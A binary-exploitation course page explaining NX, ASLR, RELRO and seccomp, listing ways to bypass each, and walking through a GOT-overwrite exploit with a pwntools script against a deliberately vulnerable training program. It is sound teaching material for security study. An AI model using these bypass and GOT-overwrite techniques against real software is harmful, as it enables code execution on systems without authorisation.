---
linkTitle: Defense Mechanisms
type: docs
weight: 10
---

# Defense Mechanisms

## Introduction

The previous sessions ([Shellcodes](../shellcodes/) and [Shellcodes Advanced](../shellcodes-advanced/)) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from **any** memory segment belonging to the process. As you can recall from the [Executable File Formats](../executable-file-formats/) session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed. This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:

*   Executable Space Protection: only certain parts of the address space exhibit the code execution right;
*   Address Space Layout Randomization (ASLR): certain parts of the address space get mapped at random locations.

In the [Return Oriented Programming](../return-oriented-prgramming) session we discussed how the **PLT**/**GOT** work in relation to resolving addresses of functions from dynamically liked libraries. We also learned how to abuse this process and trigger arbitrary code execution by **corrupting GOT entries**. We will take this exploit primitive to the next level and explore how it can be used when additional defense mechanisms are in use. 

Next, we will introduce the **RELRO** mitigation, which is designed to preclude the overwriting of relocation sections such as the GOT.

Another defense mechanism we will discuss is **seccomp**, which enables applications to enforce restrictions on the system calls performed in the process and child processes, thereby creating a sandbox.

Besides presenting these mechanisms, we are also going to take a quick look at how can we bypass them. Since these protections are ubiquitous at this time, you will have to work around them almost every time you build a binary exploit.

**IMPORTANT:** The tasks today are designed for 32 bit executables. Make sure you compile with the `-m32` flag for `gcc`. The binaries in the tasks archive are already compiled as such.

## Tutorials

The tutorials will showcase the tools used to inspect the defense mechanisms.

### General Defense Mechanisms Check

The `checksec` command-line tool is a wrapper over the functionality implemented in pwntools' `pwnlib.elf.elf` module.

To get it to work in the Kali VM, you have to update pwntools to the latest version using `pip3 install -U pwntools`.

We will use this tool throughout the session to identify which defense mechanisms are enabled for a certain binary:

```
root@kali:~/demo/nx# checksec ./no_nx
[*] '/root/demo/nx/no_nx'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

### Executable Space Protection

The `executable space protection` is an instance of the `principle of least privilege`, which is applied in many security sensitive domains. In this case, the executable space protection is used to limit the types of memory access that a process is allowed to make during execution. A memory region (i.e. page) can have the following protection levels: **READ**, **WRITE** and **EXECUTE**. The executable space protection mechanism mandates that writable regions should not be executable at the same time. This prevents code injection.

The mechanism can be (and was) implemented in many different ways, the most common in Linux being:

*   **NX bit**: This is the easiest method, and involves an extra bit added to each page table entry that specifies if the memory page should be executable or not. This is the current implementation in 64-bit processors where page table entries are 8-bytes wide. 
*   **Physical Address Extension (PAE)**: Besides the main feature that allows access to more than 4GB of memory, the PAE extension for 32-bit processor also adds a NX bit in its page table entries.
*   **Emulation**: The NX bit can be emulated on older (i.e., non-PAE) 32-bit processors by overloading the Supervisor bit ([PaX PAGEEXEC](https://en.wikipedia.org/wiki/PaX#PAGEEXEC)), or by using the segmentation mechanism and splitting the address space in half ([PaX SEGMEXEC](https://en.wikipedia.org/wiki/PaX#SEGMEXEC)).

This security feature gets in the way of **just-in-time (JIT)** compilers, which need to produce and write code at runtime, and that is later executed. Since a JIT compiler cannot run in this kind of secured environment, an application using it is vulnerable to attacks known as **JIT spraying**. The idea was first presented by Dion Blazakis, and is, briefly, a way to force the JIT compiler to produce shellcode.

*   Slides: [Black Hat & DEF CON 2010](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf);
*   Paper: [Interpreter Exploitation. Pointer Inference and JIT Spraying](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf).

There are of course other implementations in different hardening-oriented projects such as: OpenBSD [W^X](https://marc.info/?l=openbsd-misc&m=105056000801065), Red Hat [Exec Shield](https://marc.info/?l=openbsd-misc&m=105056000801065), PaX (which is now part of [grsecurity](https://grsecurity.net/)), Windows Data Execution Prevention ([DEP](https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)).

### Memory Segments Permissions Walkthrough

The Linux kernel provides support for managing memory protections using the `mmap()` and `mprotect()` syscalls. Simply put, what they do is:

*   `mmap()`: requests the OS to create a mapping (allocate space) inside the address space of the calling process. See [this answer](https://stackoverflow.com/questions/3642021/what-does-mmap-do);
*   `mprotect()`: requests the OS to set permissions over a memory region (e.g. `PROT_READ`, `PROT_WRITE`, `PROT_EXEC` and others).

These syscalls are used by the loader to set protection levels for each segment it loads when running a binary. Of course, the same functions can also be used during execution.

PaX has a protection option that restricts the use of `mprotect()` and `mmap()` to avoid resetting the permissions during execution. See [MPROTECT](https://pax.grsecurity.net/docs/mprotect.txt). Note that grsecurity/PaX are patches to the kernel, and are not available in normal distributions. You have to compile your own kernel if you want to try them out.

Let's start by deactivating ASLR, which is going to be discussed in the following section of this tutorial, and only focus on the NX protection. We can do this in two ways, as told below.

*   To disable ASLR system-wide we use (root access is required): `sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'`;
*   To create a shell with ASLR disabled (ASLR will also be disabled for future processes spawned from that shell), we use (root access is not required): `setarch $(uname -m) -R /bin/bash`.

After disabling ASLR, let's compile an extremely simple C application. Save the following code as `hello.c`:

```
int main() {
    while (1);
}
```

Make sure you have both `build-essential` and `gcc-multilib` packages installed before going further (run `sudo apt install build-essential gcc-multilib` on Debian-based systems).

Compile the `hello.c` code using `CFLAGS='-m32 -O0' make hello`. The result should be a `hello` binary.

As presented in the `Static Analysis` session, the ELF format contains flags for each segment that specify what permissions should be granted. You can use `readelf -l hello` to dump all program headers for this binary. The result should be similar to:

```
Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00568 0x00568 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000490 0x08048490 0x08048490 0x0002c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got
```

Check the `Flg` column. For example, the first `LOAD` segment contains `.text` and is marked `R E`, while the `GNU_STACK` segment is marked `RW `.

Next we are interested in seeing calls to `mmap2()` and `mprotect()` made by the loader. We are going to use the `strace` tool for this, and directly execute the loader. You can check the path to the loader on your system using `ldd hello`.

```
$ strace -e mmap2,mprotect /lib/ld-linux.so.2 ./hello
```

The output should be similar to:

```
[ Process PID=11198 runs in 32 bit mode. ]
mmap2(0x8048000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8048000
mmap2(0x8049000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8049000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffc000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffa000
mmap2(NULL, 156324, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd3000
mmap2(NULL, 1763964, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e24000
mmap2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a9000) = 0xfffffffff7fcd000
mmap2(0xf7fd0000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e23000
mprotect(0xf7fcd000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x56575000, 4096, PROT_READ)   = 0
```

We can observe a `PROT_READ|PROT_EXEC` mapping at address `0x8048000`, followed by a `PROT_READ|PROT_WRITE` at address `0x8049000` that is later changed to `PROT_READ` for the first half (4096 bytes). The later allocation is the data segment, that should be writable. We can also see a bunch of allocations for segments belonging to dynamic libraries.

Note that the **stack** is not explicitly allocated by the loader. The kernel will keep increasing it each time a page fault is triggered without calling `mmap`. Also, the **heap** will be extended on-demand as the application requires it.

We can dump all memory mappings of the running process as follows:

```
$ ps u | grep /lib/ld-linux.so.2 
... # get the PID of the loader process from this output, let's assume it is 11198
$ cat /proc/11198/maps
```

Make sure to use the PID of the loader process, and not the `strace` process.

The output of the last `cat` command should be similar to:

```
08048000-08049000 r-xp 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
08049000-0804a000 r--p 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
0804a000-0804b000 rw-p 00001000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello
56555000-56575000 r-xp 00000000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
56575000-56576000 r--p 0001f000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
56576000-56577000 rw-p 00020000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so
f7e23000-f7e24000 rw-p 00000000 00:00 0 
f7e24000-f7fcd000 r-xp 00000000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fcd000-f7fcf000 r--p 001a9000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fcf000-f7fd0000 rw-p 001ab000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so
f7fd0000-f7fd3000 rw-p 00000000 00:00 0 
f7ffa000-f7ffd000 rw-p 00000000 00:00 0 
f7ffd000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```

### Ways of Bypassing NX

Below are a few methods of exploiting a binary that has **NX** enabled:

*   **ret-to-plt/libc**. You can return to the `.plt` section and call library function already linked. You can also call other library functions based on their known offsets. The latter approach assumes no ASLR (see next section), or the possibility of an information leak. 
*   **mprotect()**. If the application is using `mprotect()` you can easily call it to modify the permissions and include `PROT_EXEC` for the stack. You can also call this in a `ret-to-libc` attack. You can also `mmap` a completely new memory region and dump the shellcode there.
*   **Return Oriented Programming (ROP)**. This is a generalization of the `ret-to-*` approach that makes use of existing code to execute almost anything. As this is probably one of the most common types of attacks, it will be discussed in depth in a future section.

### Address Space Layout Randomization

**Address Space Layout Randomization (ASLR)** is a security feature that maps different memory regions of an executable at random addresses. This prevents buffer overflow-based attacks that rely on known addresses such as the stack (for calling into shellcode), or dynamically linked libraries (for calling functions that were not already linked with the target binary). Usually, the sections that are randomly mapped are: the stack, the heap, the VDSO page, and the dynamic libraries. The code section can also be randomly mapped for [PIE](https://en.wikipedia.org/wiki/Position-independent_code#PIE) binaries.

Linux allows 3 options for its ASLR implementation that can be configured using the `/proc/sys/kernel/randomize_va_space` file. Writing **0**, **1** or **2** to this will results in the following behaviors:

*   **0**: deactivated;
*   **1**: random stack, vdso, libraries; heap is after code section; random code section (only for PIE-linked binaries);
*   **2**: random heap too.

Make sure you reactivate ASLR after the previous section of the tutorial, by one of the two options below.

If you disabled ASLR system-wide, re-enable it using (root access is required):

```
$ sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
```

If you disabled ASLR at shell level, simply **close the shell** such as issuing the `Ctrl+d` keyboard shortcut.

We can easily demonstrate the effects of ASLR on shared libraries by running `ldd` multiple times in a row on a binary such as `/bin/ls`.

In GDB, ASLR is disabled by default in order to reduce the non-determinism and make debugging easier. However, when developing exploits we will sometimes want to test them in conjunction with ASLR. To enable ASLR in GDB, use the following command:

```
pwndbg> set disable-randomization off
```

### Ways of Bypassing ASLR

Below are a few methods of exploiting a binary that has **ASLR** enabled:

*   **Bruteforce**. If you are able to inject payloads multiple times without crashing the application, you can bruteforce the address you are interested in (e.g., a target in libc). Otherwise, you can just run the exploit multiple times. Another thing to keep in mind is that, as addresses are randomized at load-time, child processes spawned with fork inherit the memory layout of the parent. Take the following scenario: we interact with a vulnerable sever that handles connections by forking to another process. We manage to obtain a leak from a child process but we are not able to create an exploit chain that leads to arbitrary code execution. However, we may still be able to use this leak in another connection, since the new process will have the same address space as the previous.
*   **NOP sled**. In the case of shellcodes, a longer NOP sled will maximize the chances of jumping inside it and eventually reaching the exploit code even if the stack address is randomized. This is not very useful when we are interested in jumping to libc or other functions, which is usually the case if the executable space protection is also active.
*   **jmp esp**. This will basically jump into the stack, no matter where it is mapped. It's actually a very rudimentary form of Return Oriented Programming which was discussed in the previous session.
*   **Restrict entropy**. There are various ways of reducing the entropy of the randomized address. For example, you can decrease the initial stack size by setting a huge amount of dummy environment variables.
*   **Partial overwrite**. This technique is useful when we are able to overwrite only the least significant byte(s) of an address (e.g. a GOT entry). We must take into account the offsets of the original and final addresses from the beginning of the mapping. If these offsets only differ in the last 8 bits, the exploit is deterministic, as the base of the mapping is aligned to 0x1000. The offsets of `read` and `write` in `libc6_2.27-3ubuntu1.2_i386` are suitable for a partial overwrite:

```
pwndbg> p read
$1 = {<text variable, no debug info>} 0xe6dd0 <__GI___libc_read>
pwndbg> p write
$2 = {<text variable, no debug info>} 0xe6ea0 <__GI___libc_write>
```

However, since bits 12-16 of the offsets differ, the corresponding bits in the full addresses would have to be bruteforced (probability 1/4). 

*   **Information leak**. The most effective way of bypassing ASLR is by using an information leak vulnerability that exposes randomized address, or at least parts of them. You can also dump parts of libraries (e.g. `libc`) if you are able to create an exploit that reads them. This is useful in remote attacks to infer the version of the library, downloading it from the web, and thus knowing the right offsets for other functions (not originally linked with the binary).

### Chaining Information Leaks with GOT Overwrite

In this tutorial we will exploit a program that is similar to the `no-ret-control` challenge from a previous session:

```
#include <stdio.h>
#include <unistd.h>
 
int main() {
	int *addr;
 
	printf("Here's a libc address: 0x%08x\n", printf);
 
	printf("Give me and address to modify!\n");
	scanf("%p", &addr);
 
	printf("Give me a value!\n");
	scanf("%u", addr);
 
	sleep(10);
 
	printf("Abandon all hope ye who reach this...\n");	
}
```

The goal is to alter the execution flow and avoid reaching the final `printf`. To this end, we will overwrite the `sleep` entry in GOT and redirect it to `exit`. However, due to ASLR, the value can not be hardcoded and must be computed at runtime. 

Whenever we operate with addresses belonging to shared libraries, we must be aware that the offsets are highly dependent on the particular build of the library. We can identify this build either by its BuildID (retrieved with the file command), or by its version string:

```
silvia@imladris:/sss/demo$ ldd ./got_overwrite
    linux-gate.so.1 (0xf7ee8000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7ccc000)
    /lib/ld-linux.so.2 (0xf7ee9000)
silvia@imladris:/sss/demo$ file $(realpath /lib/i386-linux-gnu/libc.so.6)
/lib/i386-linux-gnu/libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cf1599aa8b3cb35f79dcaea7a8b48704ecf42a19, for GNU/Linux 3.2.0, stripped
silvia@imladris:/sss/demo$ strings /lib/i386-linux-gnu/libc.so.6 | grep "GLIBC "
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
```

Alternatively, if we don't have prior knowledge of the remote system where the binary runs, but obtain via an information leak some addresses, we may be able to identify the libc based on the last 3 nibbles (a nibble is a group of 4 bits) of these addresses:

```
0xf7df6250 <__libc_system>
0xf7e780e0 <__sleep>
```

The least significant 3 nibbles of the above addresses are `250` and `0e0`, respectively.

We enter them in the [libc database](https://libc.blukat.me/) and get a match for the same `libc` build we determined earlier. 

For this `libc`, we obtain the offsets of the functions we are interested in using GDB:

```
silvia@imladris:/sss/demo$ gdb -q -n /lib/i386-linux-gnu/libc.so.6
(gdb) p printf
$1 = {<text variable, no debug info>} 0x513a0 <__printf>
(gdb) p exit
$2 = {<text variable, no debug info>} 0x30420 <__GI_exit>
```

We will also need the address of `sleep@got` (which is static because the binary is not position independent):

```
silvia@imladris:/sss/demo$ objdump -d -M intel -j .plt ./got_overwrite | grep "sleep@plt" -A1
080483b0 <sleep@plt>:
 80483b0:   ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c
```

We start the program and compute the address of exit based on the leak of printf (in another terminal):

```
>>> printf_offset = 0x513a0
>>> exit_offset = 0x30420
>>> 0xf7dfb3a0 - printf_offset + exit_offset
4158497824
```

```
silvia@imladris:/sss/demo$ ./got_overwrite
Here's a libc address: 0xf7dfb3a0
Give me and address to modify!
0x804a00c
Give me a value!
4158497824
silvia@imladris:/sss/demo$ echo $?
10
```

As we intended, the `GOT` entry corresponding to `sleep` was overwritten by exit and the program exited with code 10 without printing the final message.

The following pwntools script automates this interaction:

```
from pwn import *
 
p = process('./got_overwrite')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
sleep_got = p.elf.got['sleep']
 
p.recvuntil('libc address:')
libc_leak = int(p.recvuntil('\n')[:-1], 16)
libc_base = libc_leak - libc.symbols['printf']
 
print("Libc base is at: 0x%x" % libc_base)
 
exit = libc_base + libc.symbols['exit']
 
p.sendline(hex(sleep_got))
 
p.recvuntil('value!')
p.sendline(str(exit))
 
p.interactive()
```

### RELRO

**RELRO** (**Rel**ocation **R**ead-**O**nly) defends against attacks which overwrite data in relocation sections, such as the **GOT overwrite** we showed earlier.

It comes in two flavors:

*   **Partial**. Protects the `.init_array`, `.fini_array`, `.dynamic` and `.got` sections (but NOT `.got.plt`);
*   **Full**. Additionally protects `.got.plt`, rendering the **GOT overwrite** attack infeasible. 

In a previous session we explained how the addresses of dynamically linked functions are resolved using lazy binding. When Full RELRO is in effect, the addresses are resolved at load-time and then marked as read-only. Due to the way address space protection works, this means that the `.got` resides in the read-only mapping, instead of the read-write mapping that contains the `.bss`.

This is not a game-over in terms of exploitation, as other overwriteable code pointers often exist. These can be specific to the application we want to exploit or reside in shared libraries (for example: the GOT of shared libraries that are not compiled with RELRO). The return addresses on the stack are still viable targets.

### seccomp

**Seccomp** is a mechanism though which an application may transition into a state where the system calls it performs are restricted. The policy, which may act on a whitelist or blacklist model, is described using [eBPF](https://lwn.net/Articles/593476/).

**Seccomp** filters are instated using the `prctl` syscall (`PR_SET_SECCOMP`). Once it is in effect, the application will be effectively sandboxed and the restrictions will be inherited by child processes.

This may severely limit our exploitation prospects in some cases. In the challenges that we have solved during these sessions, a common goal was spawning a shell and retrieving a certain file (the flag). If the exploited binary used a seccomp filter that disallowed the `execve` syscall (used by the `system` library function), this would have thwarted our exploit.

The [seccomp-tools](https://github.com/david942j/seccomp-tools) suite provides tools for analyzing seccomp filters. The `dump` subcommand may be used to extract the filter from a binary at runtime and display it in a pseudocode format:

```
silvia@imladris:/sss/demo$ seccomp-tools dump ./seccomp_example
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

In the example above we see a filter operating on the whitelist model: it specifies a subset of syscalls that are allowed: `rt_sigreturn`, `sigreturn`, `exit_group`, `exit`, `open`, `read` and `write`.

To install `seccomp-tools` on the Kali VM, use the the `gem` package manager:

```
$ gem install seccomp-tools
```

## Challenges

Challenges can be found in the `activities/` directory.

### 01-04. Challenges - rwslotmachine[1-4]

All of the challenges in this section are intended to be solved with **ASLR enabled**. However, you are free to disable it while developing your exploit for debugging purposes. You are provided with the needed shared libraries from the remote system.

The challenges are based on the same "application": the binaries expose very similar functionality with minimal implementation differences. Your job is to identify the defense mechanisms in use for each of them and bypass them in order to read a flag from the remote system.

They are numbered in the suggested solving order.

**Tips**:

*   Do not waste time on reverse engineering `rwslotmachine3`! It is very similar to `rwslotmachine2`, but operates on the client/server model. 
*   To set `LD_LIBRARY_PATH` from within a pwntools script, use `p = process('./rwslotmachineX', env={'LD_LIBRARY_PATH' : '.'})`.
*   In the case of `rwslotmachine4`, you will need the shared library `libint.so` (found inside of the github repo).

### 05. Bonus - rwslotmachine5

This challenge is similar to `rwslotmachine1`. However, your exploit for the first challenge will (most likely) not work. Investigate why and develop a bypass.

**Hint**: You can find a table describing x86 syscalls [here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit). 

## Further Reading

*   [PaX PAGEEXEC](https://en.wikipedia.org/wiki/PaX#PAGEEXEC)
*   [PaX SEGMEXEC](https://en.wikipedia.org/wiki/PaX#SEGMEXEC)
*   [Black Hat & DEF CON 2010, JIT spraying slides](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf);
*   [Interpreter Exploitation. Pointer Inference and JIT Spraying](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf).
*   [DEP](https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
*   [eBPF](https://lwn.net/Articles/593476/)
